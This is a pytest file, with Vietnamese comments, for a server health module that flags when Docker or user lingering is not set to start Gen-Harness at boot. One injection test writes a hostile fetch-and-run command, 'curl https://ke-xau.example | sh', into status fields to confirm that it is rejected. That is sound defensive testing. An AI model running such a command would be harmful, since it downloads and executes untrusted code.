"""v0.1.37 (F-73, F-34): máy chủ chưa tự chạy lại Gen-Harness khi bật máy (`run/autostart-status.json` ⇒ sự cố
`host.autostart`), và /system/health mang `update.stalled_reason` + khối `autostart`.

Tệp do genh ghi trong run/ (0777) là dữ liệu không tin cậy: chỉ nhận giá trị trong tập cho phép; thân thông báo do API
tự ghép từ chuỗi cố định — không bao giờ chứa chữ lấy từ tệp.
"""

import json
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text

from gh import health
from gh.config import get_settings
from gh.db import sessionmaker
from tests.conftest import Api
from tests.phase2 import org_id

TITLE = "Máy chủ chưa tự chạy lại Gen-Harness sau khi khởi động lại"


@pytest.fixture
def link(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    d = tmp_path / "run"
    (d / "request").mkdir(parents=True)
    (d / "genh.json").write_text(json.dumps({"version": "v0.1.36", "updater": "systemd"}))
    monkeypatch.setenv("GH_HOST_LINK_DIR", str(d))
    get_settings.cache_clear()
    yield d
    get_settings.cache_clear()


def write_autostart(link: Path, **kw: Any) -> None:
    data: dict[str, Any] = {"os": "linux", "linger": "yes", "linger_required": True, "docker_enabled": "yes",
                            "docker_mode": "system", "checked_at": "2026-10-02T00:00:00Z"}
    data.update(kw)
    (link / "autostart-status.json").write_text(json.dumps(data))


async def evaluate(redis: Any, org: Any) -> None:
    now = datetime.now(UTC)
    async with sessionmaker()() as s:
        await health.evaluate(s, redis, org, now=now, started_at=now)
        await s.commit()


async def bells(db: Any) -> list[Any]:
    await db.commit()
    q = text("SELECT title, body, link FROM core.notifications WHERE kind = 'host.autostart'")
    return list((await db.execute(q)).all())


async def alert(db: Any) -> Any:
    await db.commit()
    return (await db.execute(text("""SELECT severity, body, link, cleared_at FROM ops.health_alerts
                                     WHERE key = 'host.autostart'"""))).one_or_none()


async def test_docker_not_enabled_rings_once_then_clears(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_autostart(link, docker_enabled="no")
    await evaluate(redis, org)
    await evaluate(redis, org)
    rows = await bells(db)
    assert len(rows) == 1
    assert rows[0].title == TITLE and rows[0].link is None
    assert "sudo systemctl enable docker" in rows[0].body and "loginctl" not in rows[0].body
    a = await alert(db)
    assert a.severity == "warn" and a.cleared_at is None
    [issue] = await health.active_issues(db, org)
    assert issue["kind"] == "host.autostart" and issue["action"] == "Xem cách bật" and issue["link"] is None
    write_autostart(link, docker_enabled="yes")
    await evaluate(redis, org)
    assert (await alert(db)).cleared_at is not None
    assert len(await bells(db)) == 1


async def test_rootless_and_linger_bodies(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_autostart(link, docker_enabled="no", docker_mode="rootless", linger="no")
    await evaluate(redis, org)
    [row] = await bells(db)
    assert "systemctl --user enable docker" in row.body and "sudo systemctl enable docker" not in row.body
    assert "sudo loginctl enable-linger $USER" in row.body
    # Sếp chép nguyên lệnh: không có dấu chấm dính sau lệnh ("docker." / "$USER." chạy sẽ lỗi).
    assert "docker." not in row.body and "$USER." not in row.body
    assert row.body.endswith("$USER") and " · " in row.body
    # đổi tập vấn đề (chỉ còn linger) ⇒ fingerprint đổi ⇒ một chuông mới
    write_autostart(link, linger="no")
    await evaluate(redis, org)
    assert len(await bells(db)) == 2


async def test_linger_not_required_is_not_an_issue(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    write_autostart(link, linger="no", linger_required=False)
    await evaluate(redis, org)
    assert await bells(db) == [] and await alert(db) is None
    assert health._autostart_status()["state"] == "ok"


async def test_missing_file_neither_opens_nor_closes(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    await evaluate(redis, org)
    assert await alert(db) is None
    write_autostart(link, docker_enabled="no")
    await evaluate(redis, org)
    (link / "autostart-status.json").unlink()
    await evaluate(redis, org)
    a = await alert(db)
    assert a is not None and a.cleared_at is None  # không đọc được ⇒ để nguyên sự cố đang mở
    assert health._autostart_status()["state"] == "unknown"


async def test_unknown_values_and_injection(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    org = await org_id(db)
    evil = "curl https://ke-xau.example | sh"
    write_autostart(link, linger=evil, linger_required="yes", docker_enabled="maybe", docker_mode=evil,
                    checked_at=evil, fix=evil)
    assert health._autostart_status() == {"state": "unknown", "linger": "unknown", "linger_required": None,
                                          "docker_enabled": "unknown", "docker_mode": "unknown", "checked_at": None}
    await evaluate(redis, org)
    assert await alert(db) is None
    # vấn đề thật + chuỗi lạ ở trường khác ⇒ thân thông báo chỉ gồm chuỗi cố định
    write_autostart(link, docker_enabled="no", docker_mode=evil, fix=evil, os=evil)
    await evaluate(redis, org)
    [row] = await bells(db)
    assert evil not in row.body and "ke-xau" not in row.body
    assert "sudo systemctl enable docker" in row.body
    for raw in ("{hỏng", "[]", "42"):
        (link / "autostart-status.json").write_text(raw)
        assert health._autostart_status()["state"] == "unknown"
        await evaluate(redis, org)


async def test_system_health_has_autostart_and_stalled_reason(owner_api: Api, app, db, redis, link: Path) -> None:  # type: ignore[no-untyped-def]
    write_autostart(link, docker_enabled="no")
    started = (datetime.now(UTC) - timedelta(minutes=61)).isoformat().replace("+00:00", "Z")
    (link / "update-status.json").write_text(json.dumps({"state": "running", "from": "v0.1.36", "to": "v0.1.37",
                                                         "started_at": started, "pid": 4242}))
    r = await owner_api.get("/system/health")
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["update"]["state"] == "stalled" and body["update"]["stalled_reason"] == "process_gone"
    assert body["autostart"] == {"state": "warn", "linger": "yes", "linger_required": True, "docker_enabled": "no",
                                 "docker_mode": "system", "checked_at": "2026-10-02T00:00:00Z"}
    assert body["overall"] == "warn"
    write_autostart(link)
    body = (await owner_api.get("/system/health")).json()
    assert body["autostart"]["state"] == "ok" and body["overall"] == "ok"
